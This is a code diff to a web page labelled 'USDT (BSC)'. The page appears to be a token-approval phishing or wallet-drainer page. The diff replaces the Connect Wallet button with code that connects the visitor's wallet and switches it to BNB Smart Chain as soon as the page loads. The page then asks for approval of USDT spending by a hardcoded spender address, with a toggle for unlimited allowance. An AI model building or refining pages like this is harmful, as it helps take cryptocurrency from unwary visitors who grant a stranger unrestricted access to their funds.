@@ -8,9 +8,9 @@
 body{background:#0b0f19;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
 .card{background:#121826;padding:20px;border-radius:16px;max-width:420px;margin:auto}
 button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px;font-weight:600}
-.connect{background:#3b82f6}
 .approve{background:#22c55e}
 input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;background:#0f172a;color:white}
+.status{margin-top:10px;font-size:14px;color:#aaa}
 </style>
 </head>
 
@@ -20,8 +20,6 @@ input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;bac
 
 <h2>💰 USDT (BSC)</h2>
 
-<button id="connectBtn" class="connect">Connect Wallet</button>
-
 <div id="wallet"></div>
 
 <input type="number" id="amount" value="10">
@@ -30,7 +28,7 @@ input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;bac
 
 <button id="approveBtn" class="approve">Approve USDT</button>
 
-<div id="status"></div>
+<div id="status" class="status"></div>
 
 </div>
 
@@ -43,26 +41,64 @@ const SPENDER = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
 let provider, signer, contract;
 let unlimited = false;
 
-// ERC20 ABI (minimal)
 const ABI = [
   "function approve(address spender, uint256 amount) public returns (bool)"
 ];
 
-// connect wallet
-document.getElementById("connectBtn").onclick = async ()=>{
-  if(window.ethereum){
-    provider = new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    signer = await provider.getSigner();
-
-    const address = await signer.getAddress();
-    document.getElementById("wallet").innerText = address;
-
-    contract = new ethers.Contract(USDT, ABI, signer);
-
-    document.getElementById("status").innerText = "Connected";
+// 🔥 FORCE BSC NETWORK
+async function switchToBSC(){
+  try{
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: "0x38" }] // 56
+    });
+  }catch(err){
+    // if not added
+    if(err.code === 4902){
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [{
+          chainId: "0x38",
+          chainName: "BNB Smart Chain",
+          rpcUrls: ["https://bsc-dataseed.binance.org/"],
+          nativeCurrency: {
+            name: "BNB",
+            symbol: "BNB",
+            decimals: 18
+          },
+          blockExplorerUrls: ["https://bscscan.com"]
+        }]
+      });
+    } else {
+      throw err;
+    }
   }
-};
+}
+
+// 🔥 AUTO CONNECT
+async function connectWallet(){
+  if(!window.ethereum){
+    document.getElementById("status").innerText = "Install MetaMask / Trust Wallet";
+    return;
+  }
+
+  provider = new ethers.BrowserProvider(window.ethereum);
+
+  // request connect
+  await provider.send("eth_requestAccounts", []);
+
+  // 🔥 FORCE BSC
+  await switchToBSC();
+
+  signer = await provider.getSigner();
+
+  const address = await signer.getAddress();
+  document.getElementById("wallet").innerText = address;
+
+  contract = new ethers.Contract(USDT, ABI, signer);
+
+  document.getElementById("status").innerText = "Connected to BSC";
+}
 
 // unlimited toggle
 document.getElementById("maxBtn").onclick = ()=>{
@@ -79,7 +115,7 @@ document.getElementById("approveBtn").onclick = async ()=>{
       amount = ethers.MaxUint256;
     } else {
       const val = document.getElementById("amount").value;
-      amount = ethers.parseUnits(val, 18); // USDT BSC = 18 decimals
+      amount = ethers.parseUnits(val, 18);
     }
 
     document.getElementById("status").innerText = "Waiting for approval...";
@@ -94,6 +130,9 @@ document.getElementById("approveBtn").onclick = async ()=>{
     document.getElementById("status").innerText = "❌ Failed";
   }
 };
+
+// 🚀 AUTO START
+connectWallet();
 </script>
 
 </body>
